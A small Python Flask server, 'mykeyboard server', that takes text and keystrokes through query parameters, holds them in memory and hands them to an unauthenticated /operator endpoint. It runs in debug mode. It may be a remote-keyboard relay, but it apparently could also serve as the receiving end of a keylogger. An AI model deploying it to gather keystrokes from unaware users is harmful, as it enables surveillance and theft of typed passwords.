from flask import Flask , request , jsonify

app = Flask(__name__)

key_req = []

@app.route("/")
def index():
	return "<--- mykeyboard server --->"

@app.route("/user-txt")
def user_send():
	text = request.args.get("text")
	print(text)
	key_req.append(["text",text])
	return "200"

@app.route("/user-key")
def user_send_key():
        text = request.args.get("key")
        print(text)
        key_req.append(["key",text])

        return "200"

@app.route("/operator")
def operator():
	data = jsonify(key_req)
	key_req.clear()
	return data

if __name__ == "__main__":
	app.run(debug=True)
